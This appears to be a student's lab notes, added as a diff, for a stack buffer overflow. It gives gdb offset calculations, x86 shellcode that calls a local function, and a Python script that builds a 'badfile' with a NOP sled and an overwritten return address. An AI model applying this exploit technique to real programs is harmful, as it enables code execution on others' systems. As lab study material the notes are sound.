@@ -1,0 +1,104 @@
+(gdb) p foo
+$1 = {int (int, int)} 0x56556286 <foo>
+(gdb) p (void *)$ebp + 4 - (void *)&buffer
+$2 = 855
+(gdb) p/x (void *)$ebp + 4 - (void *)&buffer
+$3 = 0x357
+(gdb) p $ebp
+$4 = (void *) 0xffffd5b8
+(gdb) p &buffer
+$5 = (char (*)[843]) 0xffffd265
+(gdb) p (void *) $ebp+8
+$6 = (void *) 0xffffd5c0
+
+
+
+distance = 0x357
+ebp_8 = 0xffffd5c0
+
+
+assembly code:
+
+format:
+push b
+push a
+call func
+
+and return value already at eax
+
+------
+xor eax, eax
+xor ecx, ecx
+
+mov ebx, 0x56556286
+
+inc ecx
+inc ecx
+inc ecx
+inc ecx
+inc ecx
+inc ecx
+
+inc eax
+
+push ecx
+push eax
+call ebx
+
+xor ecx, ecx
+push ecx
+push eax
+call ebx
+
+xor ecx, ecx
+inc ecx
+inc ecx
+inc ecx
+inc ecx
+inc ecx
+push ecx
+push eax
+call ebx
+
+xor ecx, ecx
+push ecx
+push eax
+call ebx
+
+xor ecx, ecx
+inc ecx
+inc ecx
+inc ecx
+push ecx
+push eax
+call ebx
+
+xor ecx, ecx
+inc ecx
+inc ecx
+push ecx
+push eax
+call ebx
+
+
+------
+
+
+"\x31\xC0\x31\xC9\xBB\x86\x62\x55\x56\x41\x41\x41\x41\x41\x41\x40\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\x41\x41\x41\x41\x41\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\x41\x41\x41\x51\x50\xFF\xD3\x31\xC9\x41\x41\x51\x50\xFF\xD3"
+
+
+python code:
+
+function = b"\x31\xC0\x31\xC9\xBB\x86\x62\x55\x56\x41\x41\x41\x41\x41\x41\x40\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\x41\x41\x41\x41\x41\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\x41\x41\x41\x51\x50\xFF\xD3\x31\xC9\x41\x41\x51\x50\xFF\xD3"
+distance = 0x357
+ret addr = 0x56556286
+ebp_8 = 0xffffd5c0
+NOPs = 0x250
+def p32(x):
+    return x.to_bytes(4, "little")
+
+with open("badfile", "wb") as f:
+    f.write(
+        b"\x90" * distance + p32(ebp_8) + b"\x90" * NOPs + function +
+        b"\x00" * (1655 - distance - len(function) - NOPs)
+    )
